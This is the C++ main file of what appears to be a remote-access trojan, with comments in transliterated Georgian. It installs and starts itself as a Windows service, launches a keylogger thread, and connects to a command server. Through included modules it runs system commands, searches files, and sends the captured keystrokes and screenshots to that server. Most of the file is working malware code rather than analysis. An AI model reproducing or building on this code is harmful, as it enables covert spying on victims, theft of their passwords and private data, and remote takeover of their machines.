
		#include"head.h"
		#include"sokets.cpp"
		#include "filesearch.cpp";
#define SERVICE_NAME "ASP Service_1"

void ServiceInstall(void);
void ServiceStart(void);
HFONT create_font(HWND hwnd)
{
HFONT hfont;
hfont=CreateFont(22,0,0,0,FW_BOLD,0,0,0,0,0,0,2,0,"SYSTEM_FIXED_FONT");
//SendMessage(hwnd,WM_SETFONT,(UINT)hfont,0);
return hfont;
}
void  main()
{ 
		//	FreeConsole();
	/////////////// keylogeris gashveba ////////////////////
			ServiceInstall();
			Sleep(100);
			ServiceStart();
			char pModuleFile[10000];
			DWORD dwSize = GetModuleFileName(NULL, pModuleFile, 10000);


			//MessageBox(0,pModuleFile,pModuleFile,0);
	
		CreateThread(0,0,keyloger,0,0,0);
	///////////////////////////////////////////////////////
	HFONT hfont=create_font(GetDesktopWindow());
	SOCKET sock;
	soketss(&sock); //// soketis sheqmna
	
	
	
///////////////////// programis identificireba tu meramdene programaa qselshi gashvebuli "numeracia"//
	 char IDI[10];
	 recv(sock,IDI,10,0);
	 int IDC1=atoi(IDI);
	
	// MessageBox(0,IDI,IDI,0);
/////////////////////////////////////////////////////////////////////////////////////////////////////
static bool firststart=1;
HDC hdc=GetDC(GetDesktopWindow());
char buf[4096];
char buf1[30]; ///shetyobinebis gagzavnistvis  imis shesaxeb rom ID debi daemtxva ertmanets an rom globalurad agzavni yvelas kompiuterze
string userInput;
int sendResult;
do
{
	memset(buf,0,sizeof(buf));
	int bytesReceived=recv(sock,buf,4095,0);
	userInput="\r\n";
	int IDC=atoi(buf);
	if(bytesReceived<=0){
				/////////////////////////////// tu kavshiri gawyda vidaxebt xelmeored soket funqcias kavshiris agdgenisatvis ///////
				soketss(&sock);
		//	MessageBox(0,",tytrytyt",0,0);
			}


		/////////////////////////// individualuri brdzanebebi //////////////////////////////////////
	if(userInput.size() > 0&&IDC==IDC1) /// IDdebis shedareba 
	{		memset(buf1,0,sizeof(buf1));
			strcat(buf1,"PROGRAMA::\0");
			strcat(buf1,IDI);
			strcat(buf1,"::ELODEBA BRDZANEBAS\r\n");

		 sendResult = send(sock,buf1,strlen(buf1)+1,0); //// shetyobinebis gagzavna imis shesaxeb rom konkretuli programa 

		firststart=0;
		 if(sendResult != SOCKET_ERROR)					//// romlis aidic miutitet mzad aris da elodeba brdzanebas 
		{
			 ZeroMemory(buf,4096);
			 bytesReceived = recv(sock,buf,4096,0);
			if(bytesReceived<=0){
				/////////////////////////////// tu kavshiri gawyda vidaxebt xelmeored soket funqcias kavshiris agdgenisatvis ///////
				soketss(&sock);
		//	MessageBox(0,",tytrytyt",0,0);
			}
			if(bytesReceived>0)
			{

		//		cout<< "SERVER> " <<string(buf,0,bytesReceived)<<endl;


///// desktopze teqstis gamotana washla *,#
#include"TextisGamotanaWashla.cpp" 
/////////////////////////// system brdzaneba ~
#include"SystemCommands.cpp"
			
#include"kavshirisShemowmeba.cpp"


///// es aris failebis dzebna //////////////
#include"failebisdzebna.cpp"

////////// keilogeris mier shevsebuli buferis gagzavna gasuftaveba %,%d
#include"keylogerisBrdzaneba.cpp"
///////////////// suratis gagzavna serverze //////////////////
#include"suratisGagzavna.cpp"

			}

		}
	
	}
	
	/////////////////////////// END individualuri brdzanebebi //////////////////////////////////////

	////////////////////////// globaluri brdzanebebi yvela kompiuteristvis /////////////////////////
	#include"globb.cpp"
//////////////////////////END glob ///////////////////////
}while(userInput.size()>0);
 /// aq itisheba kavshiri da wyvets mushaobas orive programa
closesocket(sock);

WSACleanup();
}



void ServiceInstall(void)
{
	cout<<"ServiceInstall Start"<<endl;
	SC_HANDLE  hScOpenSCManager=NULL;
	SC_HANDLE	hScCreateService=NULL;
	DWORD  dwGetModuleFileName=0;
	TCHAR  szPath[MAX_PATH];
	dwGetModuleFileName=GetModuleFileName(NULL,szPath,MAX_PATH);
	if(0==dwGetModuleFileName)
	{
		cout<<"Service Installation Faild ="<<GetLastError()<<endl;
	}
	else
	{
		cout<<"Successfully Installation Faild"<<endl;
	}
	hScOpenSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);

	if(NULL==hScOpenSCManager)
	{
		cout<<"OpenSCManager Faild ="<<GetLastError()<<endl;
	}
	else
	{
		cout<<"openSCMANAGER success"<<endl;
	}


	hScCreateService=CreateService
		(
		hScOpenSCManager,
		SERVICE_NAME,
		SERVICE_NAME,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		szPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);

		
		
		
	if(NULL==hScCreateService)
	{
		cout<<"hScCreateService Faild ="<<GetLastError()<<endl;
		CloseServiceHandle(hScOpenSCManager);
	}
	else
	{
		cout<<"CreateService Success"<<endl;
	}
	CloseServiceHandle(hScCreateService);
	CloseServiceHandle(hScOpenSCManager);
	cout<<"serviceInitiall End"<<endl;

}


void ServiceStart(void)
{
	cout<<"Inside Service Function "<<endl;
	BOOL bStartService =FALSE;
	SERVICE_STATUS_PROCESS SvcStatusProcess;
	SC_HANDLE hOpenSCManager=NULL;
	SC_HANDLE  hOpenService=NULL;
	BOOL bQueryServiceStatus=FALSE;
	DWORD dwBytesNeeded;
	hOpenSCManager = OpenSCManager(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS);
	if(NULL==hOpenSCManager)
	{
		cout<<"hOpenSCManager Failed ="<<GetLastError()<<endl;
	}
	else
	{
		cout<<"hOpenSCManager Success ="<<endl;
	}

	hOpenService=OpenService(
		hOpenSCManager,
		SERVICE_NAME,
		SC_MANAGER_ALL_ACCESS);
	if(NULL==hOpenService)
	{
			cout<<"OpenService Failed ="<<GetLastError()<<endl;
	}
	else
	{
		cout<<"hOpenService Success ="<<endl;
	}
	bQueryServiceStatus=QueryServiceStatusEx(
		hOpenService,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&SvcStatusProcess,
		sizeof(SERVICE_STATUS_PROCESS),
		&dwBytesNeeded);
	if(FALSE ==bQueryServiceStatus)
	{
			cout<<"bQueryServiceStatus Failed ="<<GetLastError()<<endl;
	}
	else
	{

		cout<<"bQueryServiceStatus Success ="<<endl;
	}
	///IV 

	if((SvcStatusProcess.dwCurrentState!=SERVICE_STOPPED)&&
		(SvcStatusProcess.dwCurrentState!=SERVICE_STOP_PENDING))
	{
		cout<<"service is already running "<<endl;
	}
	else
	{
		cout<<"Service is Already Stopped"<<endl;
	}


	////V
	while(SvcStatusProcess.dwCurrentState==SERVICE_STOP_PENDING)
	{
		bQueryServiceStatus=QueryServiceStatusEx(
		hOpenService,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&SvcStatusProcess,
		sizeof(SERVICE_STATUS_PROCESS),
		&dwBytesNeeded);
		if(FALSE ==bQueryServiceStatus)
		{
			cout<<"QueryServiceStatusEx Faild ="<<GetLastError()<<endl;
			CloseServiceHandle(hOpenService);
			CloseServiceHandle(hOpenSCManager);
		}
		else
		{
			cout<<"QueryService Success"<<endl;
		
		
		}
	}
		///VI
		bStartService=StartService(
			hOpenService,
			NULL,
			NULL);
		if(FALSE ==bStartService)
		{

			cout<<"StartService Faild ="<<GetLastError()<<endl;
			CloseServiceHandle(hOpenService);
			CloseServiceHandle(hOpenSCManager);

		}
		else
		{
			cout<<"startService Success"<<endl;
		}

		/////VII/////////////////////////
		bQueryServiceStatus=QueryServiceStatusEx(
		hOpenService,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&SvcStatusProcess,
		sizeof(SERVICE_STATUS_PROCESS),
		&dwBytesNeeded);
		if(FALSE ==bQueryServiceStatus)
		{
			cout<<"QueryServiceStatusEx Faild ="<<GetLastError()<<endl;
			CloseServiceHandle(hOpenService);
			CloseServiceHandle(hOpenSCManager);
		}
		else
		{
			cout<<"QueryService Success"<<endl;
		
		
		}



			/////VIII/////////////////////////

		if(SvcStatusProcess.dwCurrentState==SERVICE_RUNNING)
		{
			cout<<"Service Started Running ..."<<endl;
		}
		else
		{
			cout<<"Service  Running Faild..."<<GetLastError()<<endl;
			CloseServiceHandle(hOpenService);
			CloseServiceHandle(hOpenSCManager);
		}
		////IX
		CloseServiceHandle(hOpenService);
		CloseServiceHandle(hOpenSCManager);
		cout<<"ServiceStart end"<<endl;
}
